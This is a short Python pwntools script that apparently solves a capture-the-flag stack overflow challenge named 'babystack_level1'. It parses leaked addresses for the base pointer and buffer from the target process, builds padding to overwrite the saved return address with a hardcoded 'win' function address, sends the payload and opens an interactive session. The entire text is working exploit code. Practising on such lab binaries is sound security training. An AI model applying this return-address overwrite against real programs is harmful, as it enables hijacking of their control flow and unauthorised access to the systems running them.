from pwn import *
import chardet

r = process("/challenge/babystack_level1")

r.recvuntil(b'base pointer rbp: ')
bp = int(r.recvline(keepends=False), 16)

r.recvuntil(b'will be stored: ')
buff = int(r.recvline(keepends=False), 16)

win = 0x4012dd

input = b'a'*(bp - buff + 8)+ p64(win)
detected_encoding = chardet.detect(input)["encoding"]
print("The Input is as follows: " + input.decode(detected_encoding) + "\n")

r.sendline(input)
r.recv()
r.interactive()